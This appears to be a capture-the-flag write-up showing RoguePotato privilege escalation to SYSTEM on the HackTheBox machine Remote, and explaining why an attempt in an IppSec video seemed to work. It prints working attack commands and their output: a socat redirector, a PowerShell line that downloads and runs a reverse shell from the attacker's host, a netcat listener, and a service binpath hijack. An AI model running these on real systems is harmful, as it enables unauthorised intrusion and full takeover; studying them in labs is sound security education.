# RoguePotato on Remote

[htb-remote](/tags#htb-remote ) [hackthebox](/tags#hackthebox )
[ctf](/tags#ctf ) [windows](/tags#windows )
[seimpersonate](/tags#seimpersonate ) [roguepotato](/tags#roguepotato )
[lonelypotato](/tags#lonelypotato ) [juicypotato](/tags#juicypotato )
[ippsec](/tags#ippsec ) [socat](/tags#socat ) [htb-re](/tags#htb-re )  
  
Sep 8, 2020

RoguePotato on Remote

![](https://0xdfimages.gitlab.io/img/roguepotato-remote-cover.png)

JuicyPotato was a go-to exploit whenever I found myself with a Windows shell
with SeImpersonatePrivilege, which typically was whenever there was some kind
of webserver exploit. But Microsoft changed things in Server 2019 to brake
JuicyPotato, so I was really excited when splinter_code and decoder came up
with RoguePotato, a follow-on exploit that works around the protections put
into place in Server 2019. When I originally solved Remote back in March,
RoguePotato had not yet been released. I didn’t have time last week to add it
to my Remote write-up, so I planned to do a follow up post to show it. While
in the middle of this post, I also watched IppSec’s video where he tries to
use RoguePotato on Remote in a way that worked but shouldn’t have, raising a
real mystery. I’ll dig into that and show what happened as well.

## Background

[JuicyPotato](https://ohpe.it/juicy-potato/) abused `SeImpersonate` or
`SeAssignPrimaryToken` privileges to get execution as SYSTEM. It is actually
an improved and more flexible adaptation of RottenPotatoNG and lonelypotato.
decoder keeps a blog on [decoder.cloud](https://decoder.cloud/) with several
really detailed posts diving into the Windows internals for how impersonation
works, and how it is exploited with these exploits, and that is the place to
go to get deep into all of this. I’ll attempt the high level description.

The main thing that [Server 2019 broke](https://decoder.cloud/2018/10/29/no-
more-rotten-juicy-potato/) was that by changing how the system can contact the
OXID resolver.

> OXID resolver is part of “rpcss” service and runs on port 135. Starting from
> Windows 10 1809 & Windows Server 2019, its **no more possible** to query the
> OXID resolver on a port different than 135

The RPC binding string changed from to `host` from`host[port]`. JuicyPotato
would trigger a connection as SYSTEM to the OXID resolver created by
JuicyPotato (on the port specified by `-l [port]`), and when SYSTEM did, it
would grab that token and use the impersonation privilege to run commands as
SYSTEM. In these newer systems, it could only connect to port 135, which
obviously cannot be a rogue service in Windows as it is already in use.

But then in May 2020, [@splinter_code](https://twitter.com/splinter_code)
announced that he and [@decoder](https://twitter.com/decoder_it) had found a
workaround:

> We made
> [#JuicyPotato](https://twitter.com/hashtag/JuicyPotato?src=hash&ref_src=twsrc%5Etfw)
> great again! Get the NT
> AUTHORITY\[@decoder_it](https://twitter.com/decoder_it?ref_src=twsrc%5Etfw)
> privs again :D [pic.twitter.com/b4qLjJ6urV](https://t.co/b4qLjJ6urV)
>
> — Antonio Cocomazzi (@splinter_code) [May 7,
> 2020](https://twitter.com/splinter_code/status/1258482233020747777?ref_src=twsrc%5Etfw)

The [blog post](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-
story-welcome-roguepotato/) a few days later gives all the details. At a high
level, they figured out a way to make their own Oxid resolver, which bypasses
the restrictions. When I run `RoguePotato.exe`, I can have it start that
service on the local box, or I can start it on a Windows box I control and
have it reach out there. If I want to use the resolver on the local box, I’ll
need to create a tunnel on my box that receives on TCP 135 and redirects back
to the resolver on the target host.

## HTB Remote

### Situation

In [Remote from HackTheBox](/2020/09/05/htb-remote.html#shell), I get a shell
as iis apppool\defaultapppool with `SeImpersonatePrivilege`:

    
    
    PS C:\programdata> whoami
    iis apppool\defaultapppool
    PS C:\programdata> whoami /priv
    
    PRIVILEGES INFORMATION
    ----------------------
    
    Privilege Name                Description                               State   
    ============================= ========================================= ========
    SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
    SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
    SeAuditPrivilege              Generate security audits                  Disabled
    SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
    SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
    SeCreateGlobalPrivilege       Create global objects                     Enabled 
    SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
    

### Prep

I’ll grab [a
copy](https://github.com/antonioCoco/RoguePotato/releases/tag/1.0) of
`RoguePotato.exe` and upload it to Remote, staging out of `c:\programdata`.

Next I’ll start `socat` running on my Kali box listening on TCP 135 and
redirecting back to Remote on TCP 9999.

    
    
    root@kali# socat tcp-listen:135,reuseaddr,fork tcp:10.10.10.180:9999
    

### Execute POC

To run this, I’ll use the following command line options:

  * `-r 10.10.14.9` \- This is a required option that will identify my host;
  * `-l 9999` \- The port to listen on locally;
  * `-e cmd.exe ping 10.10.14.9` \- The command to run, starting simple.

I’ll run this will `tcpdump` listening for ICMP:

    
    
    PS C:\programdata> .\RoguePotato.exe -r 10.10.14.9 -e "cmd.exe /c ping 10.10.14.9" -l 9999
    [+] Starting RoguePotato...
    [*] Creating Rogue OXID resolver thread
    [*] Creating Pipe Server thread..
    [*] Creating TriggerDCOM thread...
    [*] Listening on pipe \\.\pipe\RoguePotato\pipe\epmapper, waiting for client to connect
    [*] Calling CoGetInstanceFromIStorage with CLSID:{4991d34b-80a1-4291-83b6-3328366b9097}
    [*] Starting RogueOxidResolver RPC Server listening on port 9999 ... 
    [*] IStoragetrigger written:102 bytes
    [*] SecurityCallback RPC call
    [*] ServerAlive2 RPC Call
    [*] SecurityCallback RPC call
    [*] ResolveOxid2 RPC call, this is for us!
    [*] ResolveOxid2: returned endpoint binding information = ncacn_np:localhost/pipe/RoguePotato[\pipe\epmapper]
    [*] Client connected!
    [+] Got SYSTEM Token!!!
    [*] Token has SE_ASSIGN_PRIMARY_NAME, using CreateProcessAsUser() for launching: cmd.exe /c ping 10.10.14.9
    [+] RoguePotato gave you the SYSTEM powerz :D
    

At `tcpdump` there are four pings from Remote:

    
    
    root@kali# tcpdump -i tun0 icmp
    tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
    listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
    07:44:15.452881 IP 10.10.10.180 > 10.10.14.9: ICMP echo request, id 1, seq 1, length 40
    07:44:15.452910 IP 10.10.14.9 > 10.10.10.180: ICMP echo reply, id 1, seq 1, length 40
    07:44:16.463541 IP 10.10.10.180 > 10.10.14.9: ICMP echo request, id 1, seq 2, length 40
    07:44:16.463600 IP 10.10.14.9 > 10.10.10.180: ICMP echo reply, id 1, seq 2, length 40
    07:44:17.478859 IP 10.10.10.180 > 10.10.14.9: ICMP echo request, id 1, seq 3, length 40
    07:44:17.478883 IP 10.10.14.9 > 10.10.10.180: ICMP echo reply, id 1, seq 3, length 40
    07:44:18.494758 IP 10.10.10.180 > 10.10.14.9: ICMP echo request, id 1, seq 4, length 40
    07:44:18.494823 IP 10.10.14.9 > 10.10.10.180: ICMP echo reply, id 1, seq 4, length 40
    

### Shell

I’ll start a Python webserver in the directory with a [Nishang reverse
shell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-
PowerShellTcp.ps1) and then update the command to have powershell download and
execute that shell:

    
    
    PS C:\programdata> .\RoguePotato.exe -r 10.10.14.9 -e "powershell -c iex( iwr http://10.10.14.9/shell.ps1 -UseBasicParsing )" -l 9999
    [+] Starting RoguePotato...
    [*] Creating Rogue OXID resolver thread
    [*] Creating Pipe Server thread..
    [*] Creating TriggerDCOM thread...
    [*] Listening on pipe \\.\pipe\RoguePotato\pipe\epmapper, waiting for client to connect
    [*] Calling CoGetInstanceFromIStorage with CLSID:{4991d34b-80a1-4291-83b6-3328366b9097}
    [*] Starting RogueOxidResolver RPC Server listening on port 9999 ... 
    [*] IStoragetrigger written:102 bytes
    [*] SecurityCallback RPC call
    [*] ResolveOxid2 RPC call, this is for us!
    [*] ResolveOxid2: returned endpoint binding information = ncacn_np:localhost/pipe/RoguePotato[\pipe\epmapper]
    [*] Client connected!
    [+] Got SYSTEM Token!!!
    [*] Token has SE_ASSIGN_PRIMARY_NAME, using CreateProcessAsUser() for launching: powershell -c iex( iwr http://10.10.14.9/shell.ps1 -UseBasicParsing )
    [+] RoguePotato gave you the SYSTEM powerz :D
    

There’s a hit at the server:

    
    
    root@kali# python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
    10.10.10.180 - - [08/Sep/2020 07:48:58] "GET /shell.ps1 HTTP/1.1" 200 -
    

And then a shell on `nc`:

    
    
    root@kali# rlwrap nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.180.
    Ncat: Connection from 10.10.10.180:49728.
    Windows PowerShell running as user REMOTE$ on REMOTE
    Copyright (C) 2015 Microsoft Corporation. All rights reserved.
    
    PS C:\programdata>whoami
    nt authority\system
    

## IppSec Mystery

### Setup

I had already been working on this post when I watched Ippsec’s Remote video
where [he runs
RoguePotato](https://www.youtube.com/watch?v=iyYqgseKUPM&t=2415s). Since he
did the box without prep, he’s giving the exploit a shot without reading the
background, and (since he probably doesn’t want to spend a long time reading
while we watch), he tries to get it working by kind of guessing at the
commands and based on his understanding of the previous exploits.

He doesn’t stand up a local redirector or a local Oxid resolver, but starts
messing with the CLSID (which was something you had to do in JuicyPpotato). He
is above to give up and come back for a new video sometime after he’s had a
chance to read about the exploit, when, somehow, it works in a way that I
initially couldn’t explain or reproduce:

[![image-20200908092002942](https://0xdfimages.gitlab.io/img/image-20200908092002942.png)_Click
for full size
image_](https://0xdfimages.gitlab.io/img/image-20200908092002942.png)

### Trying to Reproduce

Trying to reproduce this, I killed `socat` and run the following command,
which is the same as his, replacing my IP for his and running `ping` instead
of the PowerShell encoded command:

    
    
    PS C:\programdata> .\RoguePotato.exe -r 10.10.14.9 -c "{B91D5831-B1BD-4608-8198-D72E155020F7}" -e "cmd.exe /c ping 10.10.14.9" -l 9999
    [+] Starting RoguePotato...
    [*] Creating Rogue OXID resolver thread
    [*] Creating Pipe Server thread..
    [*] Creating TriggerDCOM thread...
    [*] Listening on pipe \\.\pipe\RoguePotato\pipe\epmapper, waiting for client to connect
    [*] Calling CoGetInstanceFromIStorage with CLSID:{B91D5831-B1BD-4608-8198-D72E155020F7}
    [*] Starting RogueOxidResolver RPC Server listening on port 9999 ... 
    [*] IStoragetrigger written:102 bytes
    [-] Named pipe didn't received any connect request. Exiting ... 
    

This is the same output IppSec got back, but his also executed. I didn’t get
any ICMP at `tcpdump`.

I started a second `tcpdump` to listen in TCP 135 and ran again:

    
    
    root@kali# tcpdump -ni tun0 'port 135'
    tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
    listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
    07:31:42.479528 IP 10.10.10.180.49734 > 10.10.14.9.135: Flags [SEW], seq 1988875522, win 64240, options [mss 1357,nop,wscale 8,nop,nop,sackOK], length 0
    07:31:42.479595 IP 10.10.14.9.135 > 10.10.10.180.49734: Flags [R.], seq 0, ack 1988875523, win 0, length 0
    07:31:43.003368 IP 10.10.10.180.49734 > 10.10.14.9.135: Flags [S], seq 1988875522, win 64240, options [mss 1357,nop,wscale 8,nop,nop,sackOK], length 0
    07:31:43.003490 IP 10.10.14.9.135 > 10.10.10.180.49734: Flags [R.], seq 0, ack 1, win 0, length 0
    07:31:43.518888 IP 10.10.10.180.49734 > 10.10.14.9.135: Flags [S], seq 1988875522, win 64240, options [mss 1357,nop,wscale 8,nop,nop,sackOK], length 0
    07:31:43.518916 IP 10.10.14.9.135 > 10.10.10.180.49734: Flags [R.], seq 0, ack 1, win 0, length 0
    

There are connections coming into my host on 135, but my host is just
returning TCP resets (because the port isn’t open / listening).

### Solution

I had a quick chat with decoder and he identified what was going on. Earlier
in the video, IppSec roots Remote by modifying the UsoSvc binary path,
changing it to some PowerShell that will download a shell from his host and
run it. I showed this privesc path as an unintended path for
[RE](/2020/02/01/htb-re.html#path-1-abuse-usosvc), and it works here on Remote
as well (I assume unintended). Later, when guessing at CLSIDs trying to make
RoguePotato work, he noticed UsoSvc, and decides to try that CLSID. Then he
gets a shell.

When `RoguePotato.exe` runs, it invokes the service of the corresponding
CLSID, so it isn’t RoguePotato that is getting execution, but reverse shell in
the UsoSvc.

To demonstrate, I’ll change the service `binpath` to a ping:

    
    
    PS C:\programdata> sc.exe config UsoSvc binpath= "ping -n 1 10.10.14.9" 
    [SC] ChangeServiceConfig SUCCESS 
    

I’ll stop and start the service, and on starting, it reports failure, but one
ping comes back:

    
    
    PS C:\programdata> sc.exe stop UsoSvc
    
    SERVICE_NAME: UsoSvc
            TYPE               : 30  WIN32
            STATE              : 3  STOP_PENDING
                                    (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
            WIN32_EXIT_CODE    : 0  (0x0)
            SERVICE_EXIT_CODE  : 0  (0x0)
            CHECKPOINT         : 0x3
            WAIT_HINT          : 0x7530
            
    PS C:\programdata> sc.exe start UsoSvc
    [SC] StartService FAILED 1053:
    
    The service did not respond to the start or control request in a timely fashion.
    

Now I’ll run `RoguePotato.exe` with a payload that doesn’t ping, but just
echos:

    
    
    PS C:\programdata> .\RoguePotato.exe -r 10.10.14.9 -c "{B91D5831-B1BD-4608-8198-D72E155020F7}" -e "echo oops" -l 9999
    

Immediately there is ICMP traffic at `tcpdump`. After a few seconds,
RoguePotato reports failure, with no failed attempts to contact my host on TCP
135. When the service is broken (via the modified `binpath`), it isn’t making
the connection to the Oxid resolver and RoguePotato fails.

[](/2020/09/08/roguepotato-on-remote.html)

